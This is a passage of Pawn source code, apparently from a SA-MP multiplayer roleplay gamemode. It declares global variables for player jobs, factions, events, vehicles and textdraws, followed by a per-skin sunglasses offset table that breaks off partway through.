	skinlist1 = mS_INVALID_LISTID,
	skinlist2 = mS_INVALID_LISTID,
	skinlist3 = mS_INVALID_LISTID,
	skinlist4 = mS_INVALID_LISTID,
	skinlist5 = mS_INVALID_LISTID,
	skinlist6 = mS_INVALID_LISTID,
	skinlist8 = mS_INVALID_LISTID,
	skinlist9 = mS_INVALID_LISTID,
	skinlist10 = mS_INVALID_LISTID,
	skinlist11 = mS_INVALID_LISTID,
	skinlist12 = mS_INVALID_LISTID,
	skinlist13 = mS_INVALID_LISTID,
	skinlist14 = mS_INVALID_LISTID,
	EmailId[MAX_PLAYERS][11],
	taxim[MAX_PLAYERS],
	Float:evex,
	Float:evey,
	Float:evez,
	eventenabled,
	pickup_event,
	virtuallevent,
	interiorevent,
	towo1,
	towo2,
	towo1b,
	towo2b,
	towo1c,
	towo2c,
	towo1d,
	towo2d,
	towo1e,
	towo2e,
	fight2[MAX_PLAYERS],
	reporttext[MAX_PLAYERS][128],
	reportcheater[MAX_PLAYERS] = -1,
	reportreason[MAX_PLAYERS] = 0,
	playerreported[MAX_PLAYERS] = -1,
	ticketmuie[MAX_PLAYERS],
	pickuph,
	sip,
	hitmanep,
	rusp,
	sicp,
	porp,
	trdp,
	medickase,
	taxip,
	gslsenter1,
	gslsenter2,
	gslsenter3,
	gslsenter4,
	warobjects=0,
	warobjj[200],
	//warweaponsobj[200],
	//warweapoobj=0,
	eventobjects=0,
	objectevent[11],
 	eventprizeobj[11],
	toglc[MAX_PLAYERS],
	DMGadmin[MAX_PLAYERS],
	workdeja[MAX_PLAYERS],
	candidat1 = 0,
	candidat2 = 0,
	candidat3 = 0,
	allvoted,
	activevot,
	adminsvoted,
	voted[MAX_PLAYERS],
	voted1[MAX_PLAYERS],
	voted2[MAX_PLAYERS],
	voted3[MAX_PLAYERS],
	raceoff[MAX_PLAYERS],
	Carspawn[MAX_VEHICLES],
	Destroycar = 0,
	masini = 0,
	stockss = 0,
	clanss = 0,
	factionss = 0,
	personalcar[MAX_PVEHS][MAX_PLAYERS],
	Diceid[MAX_PLAYERS],
	Dicem[MAX_PLAYERS],
	wantedlost[MAX_PLAYERS],
	CheckBus[MAX_PLAYERS],
	BusCheckk[MAX_PLAYERS],
	JobStep[MAX_PLAYERS],
	timerbus[MAX_PLAYERS],
	busc[MAX_PLAYERS],
	Float:Health[MAX_PLAYERS],
	Float:Armour[MAX_PLAYERS],
	SpamCheck[MAX_PLAYERS],
	antirem[MAX_PLAYERS],
	Clanidoff[MAX_PLAYERS],
	Float: Aimx[MAX_PLAYERS],
	Float: Aimy[MAX_PLAYERS],
	Float: Aimz[MAX_PLAYERS],
	kickafk = 0,
	Speedlimit[MAX_PLAYERS],
	togip[MAX_PLAYERS],
	tazer[MAX_PLAYERS],
	PlayerHandsup[MAX_PLAYERS],
	curatj[MAX_PLAYERS],
	XDeaths[MAX_PLAYERS],
	LastDeath[MAX_PLAYERS],
	playerdeath[MAX_PLAYERS],
	drug[MAX_PLAYERS],
	bizid[MAX_PLAYERS],
	bizprice[MAX_PLAYERS],
	bizoffer[MAX_PLAYERS],
	bool:WeaponData[MAX_PLAYERS][13],
	TimerAtuPlayer[MAX_PLAYERS],
	Cash[MAX_PLAYERS],
	SwitchKey[MAX_PLAYERS],
	bussines = 0,
	housess = 0,
	turfsss = 0,
	togfind[MAX_PLAYERS],
	TowAcc[MAX_PLAYERS],
	JackAcc[MAX_PLAYERS],
	Sunglasses[MAX_PLAYERS],
	Hatss[MAX_PLAYERS],
	vendi[MAX_PLAYERS],
	vendi2[MAX_PLAYERS],
	Vending[MAX_PLAYERS],
	FactionOffer[MAX_PLAYERS],
	hudactivated[MAX_PLAYERS],
	ReportTime[MAX_PLAYERS],
	timerreport[MAX_PLAYERS],
	Fishing[MAX_PLAYERS],
	FishTimer[MAX_PLAYERS],
	FishTimerr[MAX_PLAYERS],
	TipPeste[MAX_PLAYERS],
	farmerc[MAX_PLAYERS],
	farmertime[MAX_PLAYERS],
	timerfarmm[MAX_PLAYERS],
	timersoo[MAX_PLAYERS],
	soexpire[MAX_PLAYERS],
	BusinessRob[MAX_PLAYERS],
	RobTime[MAX_PLAYERS],
	QuestWait[MAX_PLAYERS],
	RobTimer[MAX_PLAYERS],
	//timerfree1[MAX_PLAYERS],
	somatee[MAX_PLAYERS],
	SomatePermission[MAX_PLAYERS],
	somated[MAX_PLAYERS],
	somatename[MAX_PLAYERS][30],
	TimerFree[MAX_PLAYERS],
	pizzaj[MAX_PLAYERS],
	pizzatime[MAX_PLAYERS],
	pockettime[MAX_PLAYERS],
	pizzaprize[MAX_PLAYERS],
	failpizza[MAX_PLAYERS],
	PizzaCP[MAX_PLAYERS],
	timerrent[MAX_PLAYERS],
	walktime[MAX_PLAYERS],
	deathdeletetime[MAX_PLAYERS],
	WalkStyle[MAX_PLAYERS],
	targetfind[MAX_PLAYERS],
	InHouse[MAX_PLAYERS],
	InBussines[MAX_PLAYERS],
	InHQ[MAX_PLAYERS],
	cased[MAX_PLAYERS],
	caser[MAX_PLAYERS],
	adminacceptedhelp[MAX_PLAYERS] = -1,
	licenseaccepted[MAX_PLAYERS] = -1,
	licensesend[MAX_PLAYERS] = -1,
	bool: WTToggle[MAX_PLAYERS] = false,
	Float:WTChannel[MAX_PLAYERS] = 0.0,
	arrestcop[MAX_PLAYERS] = -1,
	eventorganizer[MAX_PLAYERS],
	requestingevent[MAX_PLAYERS],
	requestingtitle[MAX_PLAYERS][50],
	requestinglocation[MAX_PLAYERS][50],
	requestingdescription[MAX_PLAYERS][100],
	requestingprize[MAX_PLAYERS],
	requestingtime[MAX_PLAYERS][50],
	payala[MAX_PLAYERS],
	activeevent,
	moneyaucutionplayer[MAX_PLAYERS],
	eventtitle[50],
	eventlocation[50],
	eventdescription[100],
	eventprize,
	eventtime[50],
	gatelspd,
	gatelvpd,
	gatelvpd2,
	gateng,
	lspdbar,
	lvpdbar,
	UsingDrugs[MAX_PLAYERS],
	Float:PlayerPos[MAX_PLAYERS][6],
	Float:PlayerPosii[MAX_PLAYERS][6],
	idletime = 3000000,
	idletimer,
	vehEngine[MAX_VEHICLES],
	HelperDuty[MAX_PLAYERS],
	AdminDuty[MAX_PLAYERS],
	vehRadio[MAX_VEHICLES],
	IsCollectingRubbish[MAX_PLAYERS],
	GarbageEndTime[MAX_PLAYERS],
	GarbageTime[MAX_PLAYERS],
	BinTime[MAX_PLAYERS],
	gPlayerUsingLoopingAnim[MAX_PLAYERS],
	gPlayerAnimLibsPreloaded[MAX_PLAYERS],
	AcceptOffer[MAX_PLAYERS],
	AcceptPrice[MAX_PLAYERS],
	FreeOffer[MAX_PLAYERS],
	FreePlayer[MAX_PLAYERS],
	FreePrice[MAX_PLAYERS],
	MatsOffer[MAX_PLAYERS],
	MatsPrice[MAX_PLAYERS],
	MatsAmmo[MAX_PLAYERS],
	SellgunOffer[MAX_PLAYERS],
	SellgunPrice[MAX_PLAYERS],
	SellgunMats[MAX_PLAYERS],
	SellgunAmmo[MAX_PLAYERS],
	SellgunID[MAX_PLAYERS],
	HouseID[MAX_PLAYERS],
	HouseOffer[MAX_PLAYERS],
	HousePrice[MAX_PLAYERS],
	ofercar[MAX_PLAYERS],
	hiddenoffer[MAX_PLAYERS],
	hiddenprice[MAX_PLAYERS],
	carprice[MAX_PLAYERS],
	primesccar[MAX_PLAYERS],
	cartype[MAX_PLAYERS],
	CarID[MAX_PLAYERS],
	tradeofferer[MAX_PLAYERS],
	tradediff[MAX_PLAYERS],
	tradecars[MAX_PLAYERS],
	tradecars2[MAX_PLAYERS],
	tradetype[MAX_PLAYERS],
	tradetype2[MAX_PLAYERS],
	flymode[MAX_PLAYERS],
	Text3D:areap,
	areape = 0,
	Text3D:WantedScris[MAX_PLAYERS],
	Text3D:DeadScris[MAX_PLAYERS],
	Text3D:dynamicevent3DText,
	Float:posxxx[MAX_PLAYERS],
	Float:posyyy[MAX_PLAYERS],
	Float:poszzz[MAX_PLAYERS],
	PlayerName[MAX_PLAYER_NAME],
	AfterTutorial[MAX_PLAYERS],
	RegistrationStep[MAX_PLAYERS],
	TakingLesson[MAX_PLAYERS],
	UsedFind[MAX_PLAYERS],
	NoFuel[MAX_PLAYERS],
	MatsHolding[MAX_PLAYERS],
	GotoMats[MAX_PLAYERS],
	PlayerStoned[MAX_PLAYERS],
	ConsumingMoney[MAX_PLAYERS],
	TutTime[MAX_PLAYERS],
	PlayerDrunk[MAX_PLAYERS],
	PlayerDrunkTime[MAX_PLAYERS],
	LiveOffer[MAX_PLAYERS],
	TalkingLive[MAX_PLAYERS],
	PlacedNews[MAX_PLAYERS],
	SelectChar[MAX_PLAYERS],
	SelectCharID[MAX_PLAYERS],
	SelectCharPlace[MAX_PLAYERS],
	ChosenSkin[MAX_PLAYERS],
	CurrentMoney[MAX_PLAYERS],
	CP[MAX_PLAYERS],
	MoneyMessage[MAX_PLAYERS],
	giveexp = 50, // SET EVENT
	recivedexp = 3,
	recivedmoney = 30000,
	eventon = 0,
	Tax, // TAX
	TaxValue,
	PaintBallWinnerKills = 0,
	Medics = 0, // MEDIC - MECANIC - TAXI ( JOB DUTY )
	MedicCall[MAX_PLAYERS],
	MedicCallTime[MAX_PLAYERS],
	Mechanics = 0,
	MechanicCall[MAX_PLAYERS],
	MechanicCallTime[MAX_PLAYERS],
	TaxiDrivers = 0,
	TaxiCall[MAX_PLAYERS],
	TaxiCallTime[MAX_PLAYERS],
	TaxiAccepted[MAX_PLAYERS],
	TransportDuty[MAX_PLAYERS],
	TransportValue[MAX_PLAYERS],
	TransportMoney[MAX_PLAYERS],
	TransportTime[MAX_PLAYERS],
	TransportCost[MAX_PLAYERS],
	TransportDriver[MAX_PLAYERS],
	JobDuty[MAX_PLAYERS],
	MedicTime[MAX_PLAYERS],
	NeedMedicTime[MAX_PLAYERS],
	TicketOffer[MAX_PLAYERS], // TICKET
	thiefplayer[MAX_PLAYERS],
	pocketjaf[MAX_PLAYERS],
	omoarathief[MAX_PLAYERS],
	thiefmoney[MAX_PLAYERS],
	TicketMoney[MAX_PLAYERS],
	GotHit[MAX_PLAYERS], // HITMAN
	GoChase[MAX_PLAYERS],
	GetChased[MAX_PLAYERS],
	OrderReady[MAX_PLAYERS],
	PlayerTied[MAX_PLAYERS], // CUFF - TIE - TAZER
	PlayerCuffed[MAX_PLAYERS],
	PlayerCuffed2[MAX_PLAYERS],
	PlayerCuffedTime[MAX_PLAYERS],
	PlayerTazeTime[MAX_PLAYERS],
	RepairOffer[MAX_PLAYERS], // REPAIR
	RepairPrice[MAX_PLAYERS],
	RefillOffer[MAX_PLAYERS],
	RefillPrice[MAX_PLAYERS],
	RepairCar[MAX_PLAYERS],
	TransferOffer[MAX_PLAYERS], // TRANSFER MONEY
	TransferMoney[MAX_PLAYERS],
	DrugOffer[MAX_PLAYERS], // DRUGS
	DrugPrice[MAX_PLAYERS],
	DrugGram[MAX_PLAYERS],
	JailPrice[MAX_PLAYERS], // BAIL PRICE
	WantedPoints[MAX_PLAYERS], // COPS
	OnDuty[MAX_PLAYERS],
	gPlayerCheckpointStatus[MAX_PLAYERS], //
	gPlayerLogged[MAX_PLAYERS],
	gPlayerLogTries[MAX_PLAYERS],
	gPlayerSpawned[MAX_PLAYERS],
	gLastCar[600],
	gOoc[MAX_PLAYERS],
 	gNews[MAX_PLAYERS],
	gFam[MAX_PLAYERS],
	BigEar[MAX_PLAYERS],
	Spectate[MAX_PLAYERS],
	SpectateState[MAX_PLAYERS],
	CellTime[MAX_PLAYERS],
	HireCar[MAX_PLAYERS],
	SafeTime[MAX_PLAYERS],
	HidePM[MAX_PLAYERS],
	PhoneOnline[MAX_PLAYERS],
	PhoneOnlineCalls[MAX_PLAYERS],
	TurfsDisp[MAX_PLAYERS],
	FirstSpawn[MAX_PLAYERS],
	Mobile[MAX_PLAYERS],
	CallCost[MAX_PLAYERS],
	gPlayerAccount[MAX_PLAYERS],
	gLastDriver[600],
	gCarLock[600];

new serverrestart2 = -1;

// TEXT
new PlayerText:logo[MAX_PLAYERS],
	Text:Time,
	Text:Date,
	PlayerText:Bus1[MAX_PLAYERS],
	PlayerText:Bus2[MAX_PLAYERS],
	PlayerText:TextDrawSpec[MAX_PLAYERS][6],
	PlayerText:farmbox[MAX_PLAYERS],
	PlayerText:farmjob[MAX_PLAYERS],
	PlayerText:farmspeed[MAX_PLAYERS],
	PlayerText:farmwanted[MAX_PLAYERS],
	PlayerText:farmtime[MAX_PLAYERS],
	PlayerText:gunoierr[MAX_PLAYERS],
	PlayerText:Jailtime[MAX_PLAYERS],
	PlayerText:FindT[MAX_PLAYERS],
	PlayerText:BusJob[MAX_PLAYERS],
	PlayerText:BusCheck[MAX_PLAYERS],
	PlayerText:DMVexam[MAX_PLAYERS],
	PlayerText:DMVcheck[MAX_PLAYERS],
	PlayerText:WantedText[MAX_PLAYERS],
	PlayerText:UndercoverText[MAX_PLAYERS],
	PlayerText:Reportss[MAX_PLAYERS],
	PlayerText:HUD[4][MAX_PLAYERS],
	PlayerText:RentCar[MAX_PLAYERS];

// CARS
new Copcar[33],
	Fbicar[19],
	LVpdcar[41],
	SFpdcar[28],
	Ngcar[12],
	Vagosc[12],
	Ballasc[15],
	Grovec[21],
	Aztecasc[15],
	taxic[12],
	news[18],
	towcar[6],
	ambcars[20],
	garbage[11],
	bus[17],
	pizza[15],
	truck[19],
	rentls[10],
	rentlv[20],
	masinils[162],
	masinilv[40],
	thea[17],
	si[14],
	farm[14],
	helpercars[6],
	admincars[6];

// VARIABILE GLOBALE
new Float:rx2,
	Float:ry2,
	Float:rz2,
	//Timer[2],
	objstore[128],
	cbjstore[128],
	ghour = 0,
	gminute = 0,
	gsecond = 0,
	dollah = 100000,
	realtime = 1,
	wotime = 15,
	levelcost = 28000,
	realchat = 1,
	timeshift = -1,
	shifthour,
	othtimer,
	zerosec,
	flytimer,
	checkafktimer,
	findtimer,
	unjailtimer,
	pnstimer,
	wantedicatimer,
	spectatetimer,
	productiontimer,
	savedatatimer,
	checkgastimer,
	checkvehinfotimer,
	stoppedvehtimer,
	cartimer,
	levelexp = 3,
	pickups,
	Float:TeleportDest[MAX_PLAYERS][3],
	Float:TelePos[MAX_PLAYERS][6];

// SUNGLASSES
new Float:SkinOffSet[312][7] = {
{0.098771, 0.030772, -0.000335, 85.342658, 84.122947, 4.236968 }, // - 0
{0.100766, 0.028630, -0.003521, 87.936676, 82.110870, 4.236968 }, // - 1
{0.083712, 0.033132, -0.003521, 87.936676, 82.110870, 4.236968 }, // - 2
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 3
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 4
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 5
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 6
{0.090066, 0.043458, -0.006523, 87.936676, 82.110870, 4.236968 }, // - 7
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 8
{0.070977, 0.028663, 0.000147, 81.164970, 92.128402, 4.236968 },  // - 9
{0.072317, 0.032179, -0.002934, 86.843269, 84.196006, 4.236968 }, // - 10
{0.072317, 0.035465, -0.002201, 86.843269, 84.196006, 4.236968 }, // - 11
{0.072317, 0.028100, -0.002201, 86.843269, 84.196006, 4.236968 }, // - 12
{0.076569, 0.028100, -0.002201, 86.843269, 84.196006, 4.236968 }, // - 13
{0.091310, 0.049169, -0.002201, 86.843269, 84.196006, 4.236968 }, // - 14
{0.073734, 0.006292, -0.002755, 86.843269, 84.196006, 4.236968 }, // - 15
{0.092845, 0.040331, 0.000183, 86.843269, 82.864280, 4.236968 },  // - 16
{0.088241, 0.030184, -0.000157, 86.843269, 82.864280, 4.236968 }, // - 17
{0.061677, 0.029596, -0.007398, 86.843269, 82.864280, 4.236968 }, // - 18
{0.079911, 0.029596, -0.002934, 86.843269, 82.864280, 4.236968 }, // - 19
{0.095079, 0.029596, -0.001718, 85.261871, 86.296562, 4.236968 }, // - 20
{0.093728, 0.042083, -0.005781, 85.261871, 81.636192, 4.236968 }, // - 21
{0.079585, 0.042083, -0.005781, 85.261871, 81.636192, 4.236968 }, // - 22
{0.090786, 0.041737, -0.005263, 85.261871, 81.636192, 4.236968 }, // - 23
{0.085247, 0.026941, -0.000317, 85.261871, 81.636192, 4.236968 }, // - 24
{0.081646, 0.031448, -0.001113, 89.393653, 81.665985, 4.236968 }, // - 25
{0.083700, 0.033814, -0.001960, 86.436462, 81.665985, 4.236968 }, // - 26
{0.092498, 0.037321, -0.001960, 86.436462, 85.568023, 4.236968 }, // - 27
{0.097068, 0.041360, -0.007881, 86.771400, 85.568023, 4.236968 }, // - 28
{0.083456, 0.050595, 0.001011, 86.771400, 77.201461, 4.236968 },  // - 29
{0.076983, 0.047168, -0.006161, 86.771400, 74.329719, 4.236968 }, // - 30
{0.083798, 0.042184, -0.001869, 86.771400, 83.181861, 4.236968 }, // - 31
{0.053021, -0.000587, -0.001869, 86.771400, 66.859710, 4.236968 },// - 32
{0.034386, 0.013324, -0.001869, 86.771400, 80.314460, 4.236968 }, // - 33
{0.104669, 0.037365, -0.001403, 86.771400, 87.178382, 4.236968 }, // - 34
{0.102659, 0.037465, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 35
{0.107638, 0.037465, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 36
{0.107638, 0.035879, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 37
{0.107638, 0.041106, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 38
{0.080326, 0.035634, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 39
{0.080326, 0.027371, -0.000829, 86.771400, 93.020492, 4.236968 }, // - 40
{0.084617, 0.039613, -0.001620, 86.771400, 93.020492, 4.236968 }, // - 41
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 42
{0.040075, 0.025445, -0.000974, 86.771400, 92.964149, 4.236968 }, // - 43
{0.077369, 0.028469, -0.000974, 86.771400, 78.435791, 4.236968 }, // - 44
{0.064145, 0.028684, -0.000974, 86.771400, 84.762802, 4.236968 }, // - 45
{0.091993, 0.056559, -0.000974, 86.771400, 84.762802, 4.236968 }, // - 46
{0.084582, 0.051277, -0.005034, 86.771400, 84.762802, 4.236968 }, // - 47
{0.092182, 0.042095, -0.003533, 86.771400, 84.762802, 4.236968 }, // - 48
{0.086866, 0.032203, -0.001021, 86.771400, 84.762802, 4.236968 }, // - 49
{0.099350, 0.009422, -0.005899, 86.771400, 84.762802, 4.236968 }, // - 50
{0.099350, 0.030598, -0.005899, 86.771400, 84.762802, 4.236968 }, // - 51
{0.099350, 0.030598, -0.003575, 86.771400, 84.762802, 4.236968 }, // - 52
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 53
{0.079123, 0.030598, -0.003575, 86.771400, 84.762802, 4.236968 }, // - 54
{0.063159, 0.029641, -0.003575, 86.771400, 84.762802, 4.236968 }, // - 55
{0.070293, 0.029641, -0.000570, 86.771400, 84.762802, 4.236968 }, // - 56
{0.111305, 0.045368, -0.000570, 86.771400, 84.458084, 4.236968 }, // - 57
{0.084901, 0.020965, -0.000570, 86.771400, 79.542411, 4.236968 }, // - 58
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 59
{0.090164, 0.044163, -0.004754, 86.771400, 79.542411, 4.236968 }, // - 60
{0.087151, 0.041447, -0.000885, 90.928329, 89.598678, 0.000000 }, // - 61
{0.094350, 0.041447, 0.005717, 90.928329, 89.598678, 0.000000 },  // - 62
{0.075534, 0.041447, -0.001751, 90.928329, 89.598678, 0.000000 }, // - 63
{0.075534, 0.041447, -0.001751, 90.928329, 89.598678, 0.000000 }, // - 64
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 65
{0.104148, 0.034787, 0.001341, 90.928329, 89.598678, 0.000000 },  // - 66
{0.104148, 0.034787, 0.001341, 90.928329, 89.598678, 0.000000 },  // - 67
{0.087317, 0.039646, -0.004032, 90.928329, 89.598678, 0.000000 }, // - 68
{0.074873, 0.039646, -0.003072, 90.928329, 89.598678, 0.000000 }, // - 69
{0.090391, 0.042364, 0.005494, 90.928329, 89.598678, 0.000000 },  // - 70
{0.090391, 0.022298, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 71
{0.090391, 0.039580, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 72
{0.090391, 0.038224, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 73
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 74
{0.083113, 0.038224, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 75
{0.072957, 0.028956, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 76
{0.069398, 0.039981, -0.001170, 90.928329, 89.598678, 0.000000 }, // - 77
{0.105738, 0.010001, 0.004508, 90.928329, 79.030494, 0.000000 },  // - 78
{0.078264, 0.019668, 0.004508, 90.928329, 79.030494, 0.000000 },  // - 79
{0.087377, 0.022096, -0.001993, 90.928329, 79.030494, 0.000000 }, // - 80
{0.087377, 0.022096, -0.001635, 90.928329, 79.030494, 0.000000 }, // - 81
{0.100623, 0.043063, -0.001635, 90.928329, 87.672645, 0.000000 }, // - 82
{0.092528, 0.027493, -0.001635, 90.928329, 87.672645, 0.000000 }, // - 83
{0.102086, 0.027493, -0.001635, 90.928329, 87.672645, 0.000000 }, // - 84
{0.081954, 0.041672, -0.001635, 90.928329, 87.672645, 0.000000 }, // - 85
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 86
{0.077010, 0.046925, -0.003438, 90.928329, 91.590301, 0.000000 }, // - 87
{0.069952, 0.042635, -0.003438, 90.928329, 86.722587, 0.000000 }, // - 88
{0.093827, 0.019258, -0.003438, 90.928329, 86.722587, 0.000000 }, // - 89
{0.066464, 0.035685, -0.000843, 90.928329, 86.722587, 0.000000 }, // - 90
{0.066464, 0.035685, -0.000843, 90.928329, 86.722587, 0.000000 }, // - 91
{0.066464, 0.038135, -0.000843, 90.928329, 86.722587, 0.000000 }, // - 92
{0.066464, 0.038135, -0.001690, 90.928329, 86.722587, 0.000000 }, // - 93
{0.048124, 0.010598, -0.001690, 90.928329, 86.722587, 0.000000 }, // - 94
{0.084997, 0.006773, -0.001690, 90.928329, 86.722587, 0.000000 }, // - 95
{0.100076, 0.026633, -0.001690, 90.928329, 80.020179, 0.000000 }, // - 96
{0.061686, 0.027537, -0.001690, 90.928329, 80.020179, 0.000000 }, // - 97
{0.098318, 0.053993, -0.001690, 90.928329, 89.237678, 0.000000 }, // - 98
{0.098318, 0.033702, -0.001690, 90.928329, 89.237678, 0.000000 }, // - 99
{0.086149, 0.042526, -0.001690, 90.928329, 77.587478, 0.000000 }, // - 100
{0.081864, 0.030555, -0.001690, 90.928329, 78.145759, 0.000000 }, // - 101
{0.081864, 0.047914, -0.005079, 90.928329, 78.145759, 0.000000 }, // - 102
{0.089607, 0.036717, -0.005079, 90.928329, 78.145759, 0.000000 }, // - 103
{0.079655, 0.042021, -0.005079, 90.928329, 78.145759, 0.000000 }, // - 104
{0.091779, 0.037620, -0.005079, 90.928329, 78.145759, 0.000000 }, // - 105
{0.084179, 0.035251, -0.005079, 90.928329, 78.145759, 0.000000 }, // - 106
{0.089387, 0.040297, -0.006006, 90.928329, 78.145759, 0.000000 }, // - 107
{0.081930, 0.030756, 0.001523, 90.928329, 78.145759, 0.000000 },  // - 108
{0.092857, 0.043070, -0.006084, 90.928329, 85.326652, 0.000000 }, // - 109
{0.092857, 0.043070, -0.006084, 90.928329, 85.326652, 0.000000 }, // - 110
{0.106601, 0.028021, -0.003537, 90.928329, 90.217376, 0.000000 }, // - 111
{0.096335, 0.015873, -0.003537, 90.928329, 90.217376, 0.000000 }, // - 112
{0.105827, 0.046620, -0.001395, 90.928329, 90.217376, 0.000000 }, // - 113
{0.097520, 0.044296, -0.007286, 90.928329, 90.217376, 0.000000 }, // - 114
{0.097408, 0.043470, -0.007286, 90.928329, 90.217376, 0.000000 }, // - 115
{0.092588, 0.049832, -0.007286, 90.928329, 90.217376, 0.000000 }, // - 116
{0.081444, 0.037602, -0.003125, 90.928329, 90.217376, 0.000000 }, // - 117
{0.078678, 0.037602, -0.001816, 90.928329, 90.217376, 0.000000 }, // - 118
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 119
{0.089214, 0.029291, -0.000784, 90.928329, 84.624763, 0.000000 }, // - 120
{0.086825, 0.033424, -0.000784, 90.928329, 77.233818, 0.000000 }, // - 121
{0.082869, 0.030783, -0.000950, 90.928329, 77.233818, 0.000000 }, // - 122
{0.096117, 0.048957, -0.006245, 90.928329, 87.579650, 0.000000 }, // - 123
{0.103663, 0.040022, 0.000449, 90.928329, 87.579650, 0.000000 },  // - 124
{0.099326, 0.031202, -0.001180, 90.928329, 87.579650, 0.000000 }, // - 125
{0.099326, 0.031132, -0.001180, 90.928329, 87.579650, 0.000000 }, // - 126
{0.099326, 0.039279, -0.001180, 90.928329, 87.579650, 0.000000 }, // - 127
{0.099326, 0.047422, -0.001180, 90.928329, 87.579650, 0.000000 }, // - 128
{0.088817, 0.021210, 0.000730, 90.928329, 87.579650, 0.000000 },  // - 129
{0.025784, 0.028323, 0.000730, 90.928329, 59.394767, 0.000000 },  // - 130
{0.068455, 0.031841, -0.004470, 90.928329, 79.979003, 0.000000 }, // - 131
{0.012930, 0.008392, -0.004470, 90.928329, 72.129173, 0.000000 }, // - 132
{0.102457, 0.032260, -0.003338, 90.928329, 84.534217, 0.000000 }, // - 133
{0.085976, 0.014956, -0.003338, 90.928329, 80.308830, 0.000000 }, // - 134
{0.071574, 0.028186, -0.001588, 90.928329, 80.308830, 0.000000 }, // - 135
{0.085219, 0.016666, -0.000738, 90.928329, 80.308830, 0.000000 }, // - 136
{0.065114, 0.009318, -0.000738, 90.928329, 80.308830, 0.000000 }, // - 137
{0.066890, 0.040024, -0.000738, 90.928329, 87.341934, 0.000000 }, // - 138
{0.072037, 0.036141, -0.000702, 90.928329, 87.341934, 0.000000 }, // - 139
{0.069108, 0.042194, -0.000436, 90.928329, 87.341934, 0.000000 }, // - 140
{0.058717, 0.043547, -0.000436, 90.928329, 87.209770, 0.000000 }, // - 141
{0.104196, 0.039601, -0.005481, 90.928329, 87.209770, 0.000000 }, // - 142
{0.090929, 0.045881, -0.012780, 90.928329, 87.209770, 0.000000 }, // - 143
{0.098291, 0.042464, -0.006952, 90.928329, 83.081665, 0.000000 }, // - 144
{0.080087, 0.030122, 0.000606, 90.928329, 83.081665, 0.000000 },  // - 145
{0.093500, 0.030690, -0.001545, 90.928329, 83.081665, 0.000000 }, // - 146
{0.079566, 0.020138, 0.004838, 90.928329, 73.715591, 0.000000 },  // - 147
{0.073564, 0.028430, -0.000527, 90.928329, 88.295433, 0.000000 }, // - 148
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 149
{0.073564, 0.028430, -0.000527, 90.928329, 88.295433, 0.000000 }, // - 150
{0.083426, 0.032359, -0.005717, 90.928329, 88.295433, 0.000000 }, // - 151
{0.072349, 0.019623, -0.000747, 90.928329, 82.624351, 0.000000 }, // - 152
{0.075065, 0.015351, 0.006545, 90.928329, 71.041442, 0.000000 },  // - 153
{0.062227, 0.029731, -0.004938, 90.928329, 84.602760, 0.000000 }, // - 154
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 155
{0.079936, 0.049000, -0.000304, 90.928329, 82.926010, 0.000000 }, // - 156
{0.067550, 0.035686, -0.000017, 90.928329, 82.926010, 0.000000 }, // - 157
{0.090676, 0.039383, -0.001726, 90.928329, 88.667900, 0.000000 }, // - 158
{0.090676, 0.039383, -0.003532, 90.928329, 88.667900, 0.000000 }, // - 159
{0.098662, 0.017441, -0.001589, 90.928329, 88.667900, 0.000000 }, // - 160
{0.105388, 0.038409, 0.003155, 90.928329, 88.667900, 0.000000 },  // - 161
{0.097415, 0.036904, -0.000525, 90.928329, 88.667900, 0.000000 }, // - 162
{0.088934, 0.023302, -0.004153, 90.928329, 80.393875, 0.000000 }, // - 163
{0.088934, 0.023302, -0.004153, 90.928329, 80.393875, 0.000000 }, // - 164
{0.087018, 0.051364, 0.000484, 90.928329, 94.584838, 0.000000 },  // - 165
{0.087018, 0.051364, 0.000484, 90.928329, 94.584838, 0.000000 },  // - 166
{0.095996, 0.038787, 0.000484, 90.928329, 84.315711, 0.000000 },  // - 167
{0.089094, 0.034001, -0.006451, 90.928329, 84.315711, 0.000000 }, // - 168
{0.075700, 0.028082, -0.006451, 90.928329, 84.315711, 0.000000 }, // - 169
{0.093751, 0.041968, -0.005545, 90.928329, 84.315711, 0.000000 }, // - 170
{0.090124, 0.031055, -0.000505, 90.928329, 84.315711, 0.000000 }, // - 171
{0.066033, 0.032915, -0.002713, 90.928329, 84.315711, 0.000000 }, // - 172
{0.088287, 0.045350, -0.005384, 90.928329, 84.315711, 0.000000 }, // - 173
{0.087750, 0.042129, -0.005384, 90.928329, 84.315711, 0.000000 }, // - 174
{0.092384, 0.039294, -0.005384, 90.928329, 84.315711, 0.000000 }, // - 175
{0.097661, 0.039065, -0.006344, 90.928329, 80.736480, 0.000000 }, // - 176
{0.097114, 0.039641, -0.006692, 90.928329, 80.736480, 0.000000 }, // - 177
{0.069354, 0.039641, -0.000474, 90.928329, 80.736480, 0.000000 }, // - 178
{0.091414, 0.039641, -0.005617, 90.928329, 80.736480, 0.000000 }, // - 179
{0.094914, 0.039641, -0.005617, 90.928329, 80.736480, 0.000000 }, // - 180
{0.117232, 0.033217, -0.001099, 90.928329, 82.396362, 0.000000 }, // - 181
{0.082569, 0.032748, -0.003248, 90.928329, 87.394371, 0.000000 }, // - 182
